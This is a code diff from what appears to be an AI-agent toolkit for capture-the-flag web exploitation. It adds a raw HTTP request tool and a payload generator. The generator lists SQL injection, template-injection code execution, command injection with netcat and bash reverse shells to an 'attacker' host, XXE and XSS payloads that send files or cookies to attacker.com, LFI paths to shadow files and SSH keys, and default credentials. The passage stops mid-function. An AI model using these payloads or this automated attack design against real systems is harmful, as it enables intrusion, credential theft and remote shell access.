@@ -7,8 +7,6 @@ import base64
 import socket
 import logging
 from typing import Dict, Any, List
-from ..kb.store import KnowledgeStore
-from ..kb.retriever import KnowledgeRetriever
 
 logger = logging.getLogger(__name__)
 
@@ -535,49 +533,9 @@ async def ysoserial_test(payload_b64: str, target: str, port: int = 4712) -> Dic
     return await ysoserial_tool.test_payload(payload_b64, target, port)
 
 
-class KBTool:
-    def __init__(self):
-        self.store = KnowledgeStore()
-        self.retriever = KnowledgeRetriever(self.store)
-
-    async def search(self, query: str, max_results: int = 5) -> Dict[str, Any]:
-        try:
-            results = self.retriever.search(query, max_results)
-            return {"success": True, "query": query, "results": results}
-        except Exception as e:
-            return {"success": False, "error": str(e)}
-
-    async def get_vulnerability(self, vulnerability_type: str) -> Dict[str, Any]:
-        try:
-            results = self.retriever.search(vulnerability_type, max_results=3)
-            if results:
-                return {"success": True, "vulnerability_type": vulnerability_type, "results": results}
-            return {"success": False, "error": f"未找到关于{vulnerability_type}的漏洞信息"}
-        except Exception as e:
-            return {"success": False, "error": str(e)}
-
-    async def get_ctf_solution(self, challenge_type: str) -> Dict[str, Any]:
-        try:
-            results = self.retriever.search(challenge_type, max_results=3)
-            if results:
-                return {"success": True, "challenge_type": challenge_type, "results": results}
-            return {"success": False, "error": f"未找到关于{challenge_type}的CTF解题思路"}
-        except Exception as e:
-            return {"success": False, "error": str(e)}
-
-    async def suggest_attack(self, service: str, port: int = None) -> Dict[str, Any]:
-        try:
-            query = f"{service} port {port}" if port else service
-            results = self.retriever.search(query, max_results=5)
-            return {"success": True, "service": service, "port": port, "suggestions": results}
-        except Exception as e:
-            return {"success": False, "error": str(e)}
-
-
 sqlmap_tool = SQLMapTool()
 fenjing_tool = FenjingTool()
 log4j_tool = Log4jTool()
-kb_tool = KBTool()
 
 
 async def sqlmap_scan(url: str, options: str = "") -> Dict[str, Any]:
@@ -634,22 +592,6 @@ async def log4j_scan(target: str, port: int = 4712, protocol: str = "tcp") -> Di
 
 async def log4j_exploit(target: str, port: int = 4712, protocol: str = "tcp", command: str = "id") -> Dict[str, Any]:
     return await log4j_tool.exploit(target, port, protocol, command)
-
-
-async def kb_search(query: str, max_results: int = 5) -> Dict[str, Any]:
-    return await kb_tool.search(query, max_results)
-
-
-async def kb_get_vulnerability(vulnerability_type: str) -> Dict[str, Any]:
-    return await kb_tool.get_vulnerability(vulnerability_type)
-
-
-async def kb_get_ctf_solution(challenge_type: str) -> Dict[str, Any]:
-    return await kb_tool.get_ctf_solution(challenge_type)
-
-
-async def kb_suggest_attack(service: str, port: int = None) -> Dict[str, Any]:
-    return await kb_tool.suggest_attack(service, port)
 
 
 class FileUploadTool:
@@ -2824,3 +2766,1099 @@ async def http_request_retry(url: str, method: str = "GET", data: str = "",
                               headers: str = "", max_retries: int = 3,
                               base_delay: float = 1.0) -> Dict[str, Any]:
     return await http_retry_helper.request_with_retry(url, method, data, headers, max_retries, base_delay)
+
+
+# === HTTP原始请求工具（解决AI生成Python代码语法错误问题）===
+def _looks_like_html(text: str) -> bool:
+    """判断响应体是否为HTML页面（用于决定是否做归一化）"""
+    import re as _re
+    head = text[:1000].lstrip().lower()
+    return head.startswith("<!doctype") or head.startswith("<html") or bool(
+        _re.search(r"<(html|body|code|pre|div|span|h[1-6]|p)\b", head))
+
+
+def _normalize_html(text: str) -> str:
+    """HTML→可读文本：样式标签剥离、块级标签转换行、实体反转义。
+
+    动机：CTF源码查看页含大量<span style=...>高亮标签（撑大体积）和
+    &lt;?php 实体转义（难读）。归一化后源码直接可读，体积缩小数倍，
+    天然落入下游2000字符截断上限内，Agent无需绕路获取完整源码。
+    """
+    import re as _re
+    import html as _html
+    # 块级标签闭合处转换行，保留文本流边界
+    t = _re.sub(r"(?i)<br\s*/?>", "\n", text)
+    t = _re.sub(r"(?i)</(p|div|h[1-6]|li|tr|code|pre)>", "\n", t)
+    # 剥掉剩余标签（含<span style=...>高亮标签），限长防贪婪匹配失控
+    t = _re.sub(r"<[^<>\n]{0,300}>", "", t)
+    # 实体反转义：&lt;→< &gt;→> &amp;→& &quot;→" &#39;→'
+    t = _html.unescape(t)
+    # 压缩连续空行
+    t = _re.sub(r"\n{3,}", "\n\n", t)
+    return t.strip()
+
+
+async def http_raw(url: str, method: str = "GET", headers: str = "",
+                   body: str = "", follow_redirects: bool = True,
+                   timeout: int = 15, body_offset: int = 0,
+                   body_limit: int = 10000) -> Dict[str, Any]:
+    """高级HTTP请求工具，支持自定义headers/method/body，替代execute_python写HTTP请求。
+
+    优势：不需要写Python代码，避免f-string花括号语法错误。
+
+    Args:
+        url: 目标URL (如 http://target:8080/path?param=value)
+        method: HTTP方法 (GET/POST/PUT/DELETE/HEAD/OPTIONS/PATCH)
+        headers: 自定义头，支持两种格式：
+                 - JSON字符串: '{"User-Agent": "Mozilla/5.0", "X-Forwarded-For": "127.0.0.1"}'
+                 - 换行格式: 'User-Agent: Mozilla/5.0\\nX-Forwarded-For: 127.0.0.1'
+        body: 请求体 (POST/PUT时使用)，按原始字节发送，工具不做任何编码/解码转换：
+              - JSON字符串: '{"key": "value"}'
+              - 表单格式: 'key=value&key2=value2'
+              - 原始文本: 直接传入
+              注意：**默认直接传原始字符，不要预先URL编码**。是否解码取决于服务端：
+              $_POST标准表单解析会自动解码（原始字符即可）；php://input等原始读取
+              会原样接收（更应传原始字符）。若报错含 unexpected '%'，说明服务端
+              收到了编码后的%序列，改传原始未编码字符即可。
+        follow_redirects: 是否跟随重定向 (默认True)
+        timeout: 超时秒数 (默认15)
+        body_offset: body分段获取的起始位置 (默认0)。用于结果被截断时补全
+        body_limit: 本次返回的body最大长度 (默认10000)
+        注意：切片基于归一化后的文本（HTML已剥标签+反转义），offset即实际返回body中的位置
+
+    Returns:
+        dict: {success, status, body, body_total, body_offset, body_truncated,
+               _kind, headers, url, redirects}
+        body_truncated=True时，用 body_offset=已取到的末尾位置 继续分段获取
+    """
+    import aiohttp
+    import json as _json
+
+    # 解析headers
+    hdrs = {}
+    if headers:
+        try:
+            hdrs = _json.loads(headers)
+        except _json.JSONDecodeError:
+            for line in headers.split("\n"):
+                line = line.strip()
+                if ":" in line:
+                    k, v = line.split(":", 1)
+                    hdrs[k.strip()] = v.strip()
+
+    redirects = []
+    try:
+        timeout_cfg = aiohttp.ClientTimeout(total=timeout)
+        connector = aiohttp.TCPConnector(ssl=False)
+
+        async with aiohttp.ClientSession(
+            timeout=timeout_cfg,
+            connector=connector,
+            auto_decompress=True,
+        ) as session:
+            # 构造请求参数
+            kwargs = {"headers": hdrs}
+            if follow_redirects:
+                kwargs["allow_redirects"] = True
+            else:
+                kwargs["allow_redirects"] = False
+
+            # 处理请求体
+            if body and method.upper() in ("POST", "PUT", "PATCH"):
+                body_stripped = body.strip()
+                if body_stripped.startswith("{"):
+                    try:
+                        json_data = _json.loads(body_stripped)
+                        kwargs["json"] = json_data
+                    except _json.JSONDecodeError:
+                        kwargs["data"] = body
+                elif "=" in body_stripped and "{" not in body_stripped:
+                    # 表单格式
+                    form_data = {}
+                    for pair in body_stripped.split("&"):
+                        if "=" in pair:
+                            k, v = pair.split("=", 1)
+                            form_data[k] = v
+                    kwargs["data"] = form_data
+                else:
+                    # 原始文本
+                    kwargs["data"] = body
+
+            # 发送请求
+            method_upper = method.upper()
+            async with session.request(method_upper, url, **kwargs) as resp:
+                resp_body = await resp.text()
+
+                # 记录重定向链
+                if hasattr(resp, 'history') and resp.history:
+                    for r in resp.history:
+                        redirects.append({
+                            "url": str(r.url),
+                            "status": r.status,
+                            "location": r.headers.get("Location", ""),
+                        })
+
+                # HTML归一化：剥样式标签+实体反转义，源码直接可读、体积缩小
+                is_html = _looks_like_html(resp_body)
+                norm_body = _normalize_html(resp_body) if is_html else resp_body
+                # 分段切片（offset/limit 基于归一化后的文本）
+                start = max(0, int(body_offset or 0))
+                limit = max(1, int(body_limit or 10000))
+                return {
+                    "success": True,
+                    "status": resp.status,
+                    "body": norm_body[start:start + limit],
+                    "body_total": len(norm_body),
+                    "body_offset": start,
+                    "body_truncated": (start + limit) < len(norm_body),
+                    "_kind": "html" if is_html else "text",
+                    "headers": dict(resp.headers),
+                    "url": str(resp.url),
+                    "redirects": redirects,
+                    "method": method_upper,
+                }
+
+    except asyncio.TimeoutError:
+        return {
+            "success": False,
+            "error": f"请求超时({timeout}秒)",
+            "url": url,
+        }
+    except aiohttp.ClientError as e:
+        return {
+            "success": False,
+            "error": f"连接错误: {str(e)}",
+            "url": url,
+        }
+    except Exception as e:
+        return {
+            "success": False,
+            "error": f"请求失败: {str(e)}",
+            "url": url,
+        }
+
+
+# === Payload生成工具（解决AI写循环批量测试代码被截断导致语法错误的问题）===
+# 背景：AI倾向于用execute_python写"循环测试多种变体"的脚本，代码超长被LLM输出截断，
+#       导致JSON解析失败、括号未闭合、SyntaxError。此工具直接返回各类payload列表，
+#       AI无需自己写循环代码，配合http_raw逐个测试即可。
+
+# IP伪造headers变体（用于绕过IP白名单/黑名单、本地访问限制）
+_PAYLOAD_IP_BYPASS = [
+    {"name": "X-Forwarded-For: 127.0.0.1", "headers": "X-Forwarded-For: 127.0.0.1"},
+    {"name": "X-Real-IP: 127.0.0.1", "headers": "X-Real-IP: 127.0.0.1"},
+    {"name": "Client-IP: 127.0.0.1", "headers": "Client-IP: 127.0.0.1"},
+    {"name": "X-Client-IP: 127.0.0.1", "headers": "X-Client-IP: 127.0.0.1"},
+    {"name": "X-Originating-IP: 127.0.0.1", "headers": "X-Originating-IP: 127.0.0.1"},
+    {"name": "X-Remote-IP: 127.0.0.1", "headers": "X-Remote-IP: 127.0.0.1"},
+    {"name": "X-Remote-Addr: 127.0.0.1", "headers": "X-Remote-Addr: 127.0.0.1"},
+    {"name": "Forwarded: for=127.0.0.1", "headers": "Forwarded: for=127.0.0.1"},
+    {"name": "Host: 127.0.0.1", "headers": "Host: 127.0.0.1"},
+    {"name": "Host: localhost", "headers": "Host: localhost"},
+    {"name": "X-Forwarded-Host: 127.0.0.1", "headers": "X-Forwarded-Host: 127.0.0.1"},
+    {"name": "X-Host: 127.0.0.1", "headers": "X-Host: 127.0.0.1"},
+    {"name": "Referer: http://127.0.0.1/", "headers": "Referer: http://127.0.0.1/"},
+    {"name": "X-Forwarded-For: 127.0.0.1, 127.0.0.1", "headers": "X-Forwarded-For: 127.0.0.1, 127.0.0.1"},
+    {"name": "X-Forwarded-For: 10.0.0.1", "headers": "X-Forwarded-For: 10.0.0.1"},
+    {"name": "X-Forwarded-For: 192.168.1.1", "headers": "X-Forwarded-For: 192.168.1.1"},
+    {"name": "X-Real-IP: 0.0.0.0", "headers": "X-Real-IP: 0.0.0.0"},
+    {"name": "X-Forwarded-For: [::1]", "headers": "X-Forwarded-For: [::1]"},
+    {"name": "Host: 127.0.0.1:80", "headers": "Host: 127.0.0.1:80"},
+    {"name": "X-Forwarded-For: 127.0.0.1\\nHost: localhost", "headers": "X-Forwarded-For: 127.0.0.1\nHost: localhost"},
+    # 组合头（多个IP伪造头同时使用）
+    {"name": "ALL_IP_HEADERS", "headers": "X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nClient-IP: 127.0.0.1\nX-Client-IP: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nForwarded: for=127.0.0.1\nX-Remote-Addr: 127.0.0.1"},
+]
+
+# User-Agent绕过变体（用于绕过UA校验、本地访问限制）
+_PAYLOAD_UA_BYPASS = [
+    {"name": "UA: local", "ua": "local"},
+    {"name": "UA: localhost", "ua": "localhost"},
+    {"name": "UA: 127.0.0.1", "ua": "127.0.0.1"},
+    {"name": "UA: internal", "ua": "internal"},
+    {"name": "UA: admin", "ua": "admin"},
+    {"name": "UA: crawler", "ua": "crawler"},
+    {"name": "UA: bot", "ua": "bot"},
+    {"name": "UA: spider", "ua": "spider"},
+    {"name": "UA: Googlebot", "ua": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
+    {"name": "UA: Baiduspider", "ua": "Baiduspider+(+http://www.baidu.com/search/spider.htm)"},
+    {"name": "UA: curl", "ua": "curl/7.68.0"},
+    {"name": "UA: wget", "ua": "Wget/1.20.3 (linux-gnu)"},
+    {"name": "UA: Python-requests", "ua": "python-requests/2.25.1"},
+    {"name": "UA: Python-urllib", "ua": "Python-urllib/3.9"},
+    {"name": "UA: local_man", "ua": "local_man"},
+    {"name": "UA: localman", "ua": "localman"},
+    {"name": "UA: Mozilla+local", "ua": "Mozilla/5.0 (local)"},
+    {"name": "UA: empty", "ua": ""},
+    {"name": "UA: Internal-Admin", "ua": "Internal-Admin"},
+    {"name": "UA: HealthCheck", "ua": "HealthCheck/1.0"},
+]
+
+# 文件包含路径变体
+_PAYLOAD_LFI_PATHS = [
+    "/etc/passwd",
+    "/etc/shadow",
+    "/etc/hosts",
+    "/etc/hostname",
+    "/etc/passwd%00",
+    "/etc/passwd%00.jpg",
+    "/etc/passwd%00.html",
+    "../../../../etc/passwd",
+    "../../../../../etc/passwd",
+    "../../../../../../etc/passwd",
+    "/proc/self/environ",
+    "/proc/self/cmdline",
+    "/proc/self/status",
+    "/var/log/apache2/access.log",
+    "/var/log/nginx/access.log",
+    "/var/log/auth.log",
+    "/var/www/html/.env",
+    "/var/www/html/config.php",
+    "/var/www/html/flag",
+    "/var/www/html/flag.txt",
+    "/var/www/html/flag.php",
+    "/flag",
+    "/flag.txt",
+    "/flag.php",
+    "/root/.bash_history",
+    "/root/.ssh/id_rsa",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/convert.base64-encode/resource=flag.php",
+    "php://filter/convert.base64-encode/resource=config.php",
+    "php://filter/convert.base64-encode/resource=/etc/passwd",
+    "php://filter/read=convert.base64-encode/resource=index.php",
+    "php://input",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
+    "data://text/plain,<?php system('id')?>",
+    "expect://id",
+    "file:///etc/passwd",
+    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+]
+
+# 目录爆破字典（CTF常用敏感路径）
+_PAYLOAD_DIR_WORDLIST = [
+    "admin", "admin/", "admin.php", "admin/index.php", "admin/login.php",
+    "login", "login.php", "login.html",
+    "flag", "flag.php", "flag.txt", "flag/", "getflag", "getflag.php",
+    "robots.txt", "sitemap.xml", ".htaccess", ".git/config", ".git/HEAD",
+    ".env", "config.php", "config.ini", "config.json", "config.yml", "config.yaml",
+    "backup", "backup.zip", "backup.tar.gz", "backup.sql", "db.sql",
+    "upload", "upload.php", "uploads/", "uploads.php",
+    "shell.php", "shell.php.bak", "cmd.php", "webshell.php",
+    "test", "test.php", "debug", "debug.php", "info.php", "phpinfo.php",
+    "api", "api/v1", "api/v1/users", "api/login",
+    "user", "user.php", "users.php",
+    "index.php.bak", "index.bak", "www.zip", "www.tar.gz", "web.zip",
+    ".DS_Store", ".svn/entries", ".idea/",
+    "console", "shell", "terminal",
+    "source", "source.php", "src/",
+    "include", "include.php", "includes/",
+    "config", "configuration",
+    "system", "system.php",
+    "private", "secret", "hidden",
+    "1.php", "1.txt", "1.html",
+    "readme", "readme.txt", "readme.md", "README.md",
+    "changelog", "changelog.txt",
+    "download", "download.php",
+    "file", "file.php", "files/",
+    "log", "log.php", "logs/",
+    "phpmyadmin", "pma", "mysql", "sql",
+    ".git/", ".svn/", ".hg/",
+    "swagger.json", "swagger-ui",
+    "actuator", "actuator/env", "actuator/health",
+    "metrics", "env", "health",
+]
+
+# SQL注入payload
+_PAYLOAD_SQLI = [
+    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
+    "' OR 1=1#", "\" OR 1=1#", "' OR 1=1-- -", "'--", "\"--",
+    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
+    "admin'--", "admin'#", "admin' OR '1'='1'--",
+    "' AND SLEEP(5)--", "\" AND SLEEP(5)--", "' AND BENCHMARK(5000000,MD5(1))--",
+    "1; DROP TABLE users--", "1; SELECT * FROM users--",
+    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "' UNION SELECT user,password FROM users--",
+    "' UNION SELECT table_name,2 FROM information_schema.tables--",
+    "' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--",
+    "admin' OR '1'='1'/*", "admin' OR 1=1#",
+    "' OR ''='", "' OR 'x'='x",
+    "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>50--",
+    "' AND IF(1=1,SLEEP(5),0)--",
+    "' /*!50000UNION*/ SELECT NULL--",
+    "0x31", "CHAR(49,48,48)",
+    "' OR 1=1 LIMIT 1--",
+    "' UNION ALL SELECT NULL,NULL,NULL--",
+]
+
+# SSTI payload
+_PAYLOAD_SSTI = [
+    "{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
+    "{{config}}", "{{config.items()}}", "{{request}}", "{{request.application}}",
+    "{{''.__class__.__mro__[1].__subclasses__()}}",
+    "{{''.__class__.__mro__[2].__subclasses__()}}",
+    "{{().__class__.__bases__[0].__subclasses__()}}",
+    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
+    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').readlines()}}",
+    "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
+    "{%import os%}{{os.popen('id').read()}}",
+    "{{self.__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
+    "{{lipsum.__globals__['os'].popen('id').read()}}",
+    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
+    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
+    "{{request['__class__']['__mro__'][1]['__subclasses__']()}}",
+    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
+    "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}",
+    "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}",
+    "{{ class }}", "{{ dir(class) }}", "{{ ''.__class__ }}",
+    "${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "{{ 'id'|cmd }}",
+    "{{ '7'*7 }}",
+    "{{ ''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('id').read() }}",
+]
+
+# 命令注入payload
+_PAYLOAD_CMDI = [
+    "; id", "| id", "&& id", "|| id", "& id", "`id`", "$(id)",
+    ";id", "|id", "&&id",
+    "; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd",
+    "; ls -la", "| ls -la", "&& ls -la",
+    "; cat /flag", "| cat /flag", "&& cat /flag",
+    "; cat /flag.txt", "| cat /flag.txt", "&& cat /flag.txt",
+    "; whoami", "| whoami", "&& whoami",
+    "; cat /etc/hostname", "| cat /etc/hostname",
+    "; find / -name flag* 2>/dev/null", "| find / -name flag* 2>/dev/null",
+    "; ls /", "| ls /",
+    "%3B%20id", "%7C%20id", "%26%26%20id",
+    "0x3b id", "0x7c id",
+    "$IFS id", ";$IFS id",
+    "{id,}", ";{id}",
+    "; cat /proc/self/environ",
+    "; env",
+    "; set",
+    "|| id ;", "&& id #",
+    "; cat /var/log/apache2/access.log",
+    "; php -r 'system(\"id\");'",
+    "; python -c 'import os; os.system(\"id\")'",
+    "; perl -e 'system(\"id\")'",
+    "; ruby -e 'system(\"id\")'",
+    "; nc -e /bin/sh attacker 4444",
+    "; bash -i >& /dev/tcp/attacker/4444 0>&1",
+]
+
+# XXE payload
+_PAYLOAD_XXE = [
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag.txt\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo/>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/shadow\">]><data>&file;</data>",
+    "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE data [<!ENTITY dtd SYSTEM \"http://attacker.com/evil.dtd\">]><data>&dtd;</data>",
+    "<?xml version=\"1.0\"?><!DOCTYPE replace [<!ENTITY info \"Any text\">]><root>&info;</root>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\">]><foo>&xxe;</foo>",
+]
+
+# 反序列化payload（PHP/Python常见类名）
+_PAYLOAD_DESERIALIZE_HINTS = [
+    {"lang": "php", "class": "stdClass", "note": "PHP基础类，常用于构造POP链起点"},
+    {"lang": "php", "class": "Exception", "note": "可触发__toString"},
+    {"lang": "php", "class": "Error", "note": "PHP7+，可触发__toString"},
+    {"lang": "php", "class": "SplFileObject", "note": "可用于读文件：__toString触发读取"},
+    {"lang": "php", "class": "SplFileInfo", "note": "文件信息类"},
+    {"lang": "php", "class": "GlobIterator", "note": "可遍历目录：FilesystemIterator子类"},
+    {"lang": "php", "class": "SplStack", "note": "可触发__wakeup"},
+    {"lang": "php", "class": "SplQueue", "note": "可触发__wakeup"},
+    {"lang": "php", "class": "ArrayObject", "note": "可触发__wakeup，常作POP链入口"},
+    {"lang": "php", "class": "Serializable", "note": "自定义序列化接口"},
+    {"lang": "php", "class": "DateTime", "note": "可触发__wakeup"},
+    {"lang": "php", "class": "DateInterval", "note": "可触发__wakeup"},
+    {"lang": "php", "class": "SplDoublyLinkedList", "note": "可触发__wakeup"},
+    {"lang": "python", "class": "os._wrap_close", "note": "Python反序列化常用：os.system('cmd')入口"},
+    {"lang": "python", "class": "subprocess.Popen", "note": "可执行命令"},
+    {"lang": "python", "class": "commands.getoutput", "note": "Python2命令执行"},
+    {"lang": "python", "class": "builtins.eval", "note": "执行任意代码"},
+    {"lang": "python", "class": "builtins.exec", "note": "执行任意代码"},
+]
+
+# 认证绕过payload
+_PAYLOAD_AUTH_BYPASS = [
+    {"name": "admin:admin", "user": "admin", "pass": "admin"},
+    {"name": "admin:password", "user": "admin", "pass": "password"},
+    {"name": "admin:123456", "user": "admin", "pass": "123456"},
+    {"name": "admin:admin123", "user": "admin", "pass": "admin123"},
+    {"name": "admin:root", "user": "admin", "pass": "root"},
+    {"name": "admin:toor", "user": "admin", "pass": "toor"},
+    {"name": "root:root", "user": "root", "pass": "root"},
+    {"name": "root:toor", "user": "root", "pass": "toor"},
+    {"name": "root:password", "user": "root", "pass": "password"},
+    {"name": "test:test", "user": "test", "pass": "test"},
+    {"name": "test:123456", "user": "test", "pass": "123456"},
+    {"name": "guest:guest", "user": "guest", "pass": "guest"},
+    {"name": "user:user", "user": "user", "pass": "user"},
+    {"name": "admin:admin@123", "user": "admin", "pass": "admin@123"},
+    {"name": "admin:P@ssw0rd", "user": "admin", "pass": "P@ssw0rd"},
+    {"name": "admin:admin888", "user": "admin", "pass": "admin888"},
+    {"name": "admin:12345678", "user": "admin", "pass": "12345678"},
+    {"name": "admin:admin.com", "user": "admin", "pass": "admin.com"},
+    {"name": "admin:qwerty", "user": "admin", "pass": "qwerty"},
+    {"name": "admin:letmein", "user": "admin", "pass": "letmein"},
+    {"name": "admin:welcome", "user": "admin", "pass": "welcome"},
+    {"name": "admin:monkey", "user": "admin", "pass": "monkey"},
+    {"name": "admin:abc123", "user": "admin", "pass": "abc123"},
+    {"name": "admin:1234", "user": "admin", "pass": "1234"},
+    {"name": "admin:password1", "user": "admin", "pass": "password1"},
+    {"name": "admin:iloveyou", "user": "admin", "pass": "iloveyou"},
+    {"name": "admin:trustno1", "user": "admin", "pass": "trustno1"},
+    {"name": "admin:shadow", "user": "admin", "pass": "shadow"},
+    {"name": "admin:pass", "user": "admin", "pass": "pass"},
+    {"name": "admin:password123", "user": "admin", "pass": "password123"},
+    {"name": "SQL: ' OR '1'='1", "user": "admin' OR '1'='1'--", "pass": "anything"},
+    {"name": "SQL: \" OR \"1\"=\"1", "user": "admin\" OR \"1\"=\"1\"--", "pass": "anything"},
+    {"name": "SQL: ' OR 1=1--", "user": "' OR 1=1--", "pass": "anything"},
+    {"name": "SQL: admin'--", "user": "admin'--", "pass": "anything"},
+    {"name": "SQL: admin'#", "user": "admin'#", "pass": "anything"},
+    {"name": "Empty user/pass", "user": "", "pass": ""},
+    {"name": "Null byte user", "user": "admin%00", "pass": "admin%00"},
+    {"name": "Array bypass", "user": "admin[]", "pass": "admin[]"},
+    {"name": "Array bypass2", "user": ["admin"], "pass": ["admin"]},
+]
+
+# XSS payload（用于测试和绕过）
+_PAYLOAD_XSS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "\" onmouseover=alert(1) x=\"",
+    "' onmouseover=alert(1) x='",
+    "<a href=javascript:alert(1)>x</a>",
+    "<script>document.cookie</script>",
+    "<img src=x onerror=document.location='http://attacker/?c='+document.cookie>",
+    "<svg><script>alert(1)</script></svg>",
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<scr<script>ipt>alert(1)</script>",
+    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
+    "<<script>script>alert(1)</script>",
+    "<script>fetch('http://attacker/?c='+document.cookie)</script>",
+    "javascript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1)\">",
+]
+
+_PAYLOAD_CATEGORIES = {
+    "ip_bypass": ("IP伪造headers变体(用于绕过IP白名单/本地访问限制)", _PAYLOAD_IP_BYPASS),
+    "ua_bypass": ("User-Agent绕过变体(用于绕过UA校验/本地访问标记)", _PAYLOAD_UA_BYPASS),
+    "lfi_paths": ("文件包含路径(本地文件包含LFI payload)", _PAYLOAD_LFI_PATHS),
+    "dir_wordlist": ("目录爆破字典(CTF常用敏感路径)", _PAYLOAD_DIR_WORDLIST),
+    "sqli": ("SQL注入payload(含UNION/布尔/时间盲注/报错)", _PAYLOAD_SQLI),
+    "ssti": ("SSTI服务端模板注入payload(Jinja2/Twig/Freemarker等)", _PAYLOAD_SSTI),
+    "cmdi": ("命令注入payload(; | && || $() `` 等变体)", _PAYLOAD_CMDI),
+    "xxe": ("XXE外部实体注入payload(读文件/SSRF/OOB)", _PAYLOAD_XXE),
+    "deserialize": ("反序列化提示(PHP/Python常见POP链入口类)", _PAYLOAD_DESERIALIZE_HINTS),
+    "auth_bypass": ("认证绕过payload(弱口令+SQL注入绕过+数组绕过)", _PAYLOAD_AUTH_BYPASS),
+    "xss": ("XSS payload(测试和绕过变体)", _PAYLOAD_XSS),
+}
+
+
+async def payload_gen(category: str = "", custom_data: str = "") -> Dict[str, Any]:
+    """生成CTF常用payload列表，避免AI自己写循环代码导致被截断/语法错误。
+
+    背景：AI用execute_python写"循环批量测试多种变体"的脚本时，代码超长会被LLM输出
+    token限制截断，导致JSON解析失败、括号未闭合、SyntaxError。
+    使用此工具获取payload列表后，配合http_raw逐个测试即可，无需写Python代码。
+
+    Args:
+        category: payload类别(必填)，可选值：
+                  - ip_bypass: IP伪造headers变体(绕过IP白名单/本地访问限制)
+                  - ua_bypass: User-Agent绕过变体(绕过UA校验/本地访问标记)
+                  - lfi_paths: 文件包含路径(LFI payload)
+                  - dir_wordlist: 目录爆破字典(CTF常用敏感路径)
+                  - sqli: SQL注入payload(UNION/布尔/时间盲注/报错)
+                  - ssti: SSTI服务端模板注入payload
+                  - cmdi: 命令注入payload(; | && || $() `` 等)
+                  - xxe: XXE外部实体注入payload
+                  - deserialize: 反序列化提示(PHP/Python常见POP链入口类)
+                  - auth_bypass: 认证绕过payload(弱口令+SQL注入绕过+数组绕过)
+                  - xss: XSS payload(测试和绕过变体)
+                  - list: 列出所有可用类别
+        custom_data: 自定义数据(可选)，用于追加自定义payload到结果中。
+                     格式：每行一个payload，自动合并到返回列表。
+
+    Returns:
+        dict: {
+            success: bool,
+            category: str,
+            description: str,
+            count: int,
+            payloads: list,  # payload列表
+            usage_hint: str,  # 使用提示，说明如何配合http_raw使用
+        }
+    """
+    if not category:
+        return {
+            "success": False,
+            "error": "category参数必填，传 'list' 查看所有可用类别",
+            "available_categories": list(_PAYLOAD_CATEGORIES.keys()),
+        }
+
+    if category == "list":
+        cats = []
+        for k, (desc, _) in _PAYLOAD_CATEGORIES.items():
